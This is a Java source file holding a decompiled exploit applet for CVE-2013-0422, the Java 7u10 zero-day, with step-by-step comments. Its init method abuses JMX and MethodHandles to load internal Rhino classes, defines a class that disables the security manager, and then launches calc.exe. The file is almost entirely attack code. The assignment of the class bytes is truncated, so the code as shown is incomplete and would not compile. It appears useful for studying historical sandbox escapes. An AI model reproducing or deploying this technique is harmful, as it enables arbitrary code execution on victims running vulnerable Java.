/*
  Java 0day 1.7.0_10 decrypted source
  Originally placed on https://damagelab.org/index.php?showtopic=23719&st=0
  From Russia with love.
*/

import java.applet.Applet;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;

import com.sun.jmx.mbeanserver.JmxMBeanServer;
import com.sun.jmx.mbeanserver.JmxMBeanServerBuilder;
import com.sun.jmx.mbeanserver.MBeanInstantiator;

// Decompiled exploit found in the wild for CVE-2013-0422
// Source modified (formatting/style/commenting) from https://gist.github.com/anonymous/4509036
// Additional discussion on https://www.reddit.com/r/netsec/comments/16buer/source_code_for_the_java_7_0day/
public class Exploit extends Applet {

	private static final long serialVersionUID = 1L;

	public static byte[] hex2Byte(String inputString) {
		byte[] byteArray = new byte[inputString.length() / 2];
		for (int i = 0; i < byteArray.length; i++) {
			byteArray[i] = (byte) Integer.parseInt(inputString.substring(2 * i, 2 * i + 2), 16);
		}
		return byteArray;
	}

	public static byte[] classBBytes = hex2Byte
	
	// Decompilation credit to benmmurphy
	// http://www.reddit.com/r/netsec/comments/16b4n1/0day_exploit_fo_java_17u10_spotted_in_the_wild/c7ulpd7
	// basically, it's this, as if this were compiled and saved on disk.
//	static class B implements PrivilegedExceptionAction<Object> {
//		public B() {
//			try {
//				AccessController.doPrivileged(this);
//			} catch (Exception e) {
//			}
//		}
//
//		public Object run() {
//			// This basically removes the security manager
//			System.setSecurityManager(null);
//			return new Object();
//		}
//	}
	

	@SuppressWarnings("rawtypes")
	@Override
	public void init() {
		try {
			// ================================================================
			// STEP 0: get introspection objects

			// Conveniences
			ClassLoader nullClassLoader = null;
			Object[] noArgs = {};

			// "Returns a lookup object which is trusted minimally.
			// It can only be used to create method handles to publicly accessible fields and methods."
			MethodHandles.Lookup lookup = MethodHandles.publicLookup();

			// Used to load the "sun.org.mozilla.javascript.internal.*" classes
			// Looks like these classes load some normally inaccessible
			// libraries. Can't find any good documentation on them.
			MBeanInstantiator beanInstantiator = ((JmxMBeanServer) new JmxMBeanServerBuilder().newMBeanServer("", null, null)).getMBeanInstantiator();

			// Used to invoke reflection on the javascript classes
			// method type: MethodHandle <method> (Class, String, MethodType)
			MethodType methodHandleClassStringMethodType = MethodType.methodType(MethodHandle.class, Class.class, new Class[] {String.class, MethodType.class });

			// MethodHandles.Lookup.findVirtual(Class, String, MethodType)
			MethodHandle findVirtualMethodHandle = lookup.findVirtual(MethodHandles.Lookup.class, "findVirtual", methodHandleClassStringMethodType);

			// method type: MethodHandle <method> (Class, MethodType)
			MethodType methodHandleClassMethodType = MethodType.methodType(MethodHandle.class, Class.class, new Class[] { MethodType.class });

			// MethodHandles.Lookup.findConstructor(Class, MethodType)
			MethodHandle lookupFindConstructorMethodHandle = lookup.findVirtual(MethodHandles.Lookup.class, "findConstructor", methodHandleClassMethodType);

			// ================================================================
			// STEP 1: Load the GeneratedClassLoader interface that declares a
			// public "defineClass" method so we can take our bytes and turn it into a live Java Class.
			Class generatedClassLoaderClass = beanInstantiator.findClass("sun.org.mozilla.javascript.internal.GeneratedClassLoader", nullClassLoader);

			// ================================================================
			// STEP 2: Create a Javascript "Context" to get a reference to a
			// Javascript GeneratedClassLoader via "Context.createClassLoader(ClassLoader)".
			Class contextClass = beanInstantiator.findClass("sun.org.mozilla.javascript.internal.Context", nullClassLoader);
			MethodType voidMethodType = MethodType.methodType(Void.TYPE);
			MethodHandle contextContext = (MethodHandle) lookupFindConstructorMethodHandle.invokeWithArguments(new Object[] { lookup, contextClass, voidMethodType });
			Object jsContext = contextContext.invokeWithArguments(noArgs);

			// ================================================================
			// STEP 3: Create a GeneratedClassLoader object.
			MethodType generatedClassLoaderMethodType = MethodType.methodType(generatedClassLoaderClass, ClassLoader.class);
			MethodHandle createClassLoaderMethodHandle = (MethodHandle) findVirtualMethodHandle.invokeWithArguments(new Object[] { lookup, contextClass, "createClassLoader", generatedClassLoaderMethodType });
			Object generatedClassLoader = createClassLoaderMethodHandle.invokeWithArguments(new Object[] { jsContext, null });

			// ================================================================
			// STEP 4: Define the class "B" - the bytes of "classBBytes" is
			// basically what you would get "on disk" if you compiled the "B" class.
			MethodType stringByteArrayMethodType = MethodType.methodType(Class.class, String.class, new Class[] { byte[].class });
			MethodHandle defineClassMethodHandle = (MethodHandle) findVirtualMethodHandle.invokeWithArguments(new Object[] { lookup, generatedClassLoaderClass, "defineClass", stringByteArrayMethodType });
			Class classBInstance = (Class) defineClassMethodHandle.invokeWithArguments(new Object[] { generatedClassLoader, null, classBBytes });

			// ================================================================
			// STEP 5: Create a new "B" object, which disables the security manager in it's constructor
			classBInstance.newInstance();

			// ================================================================
			// PROFIT!!!1!
			Runtime.getRuntime().exec("calc.exe");
		} catch (Throwable e) {
			e.printStackTrace();
		}
	}

}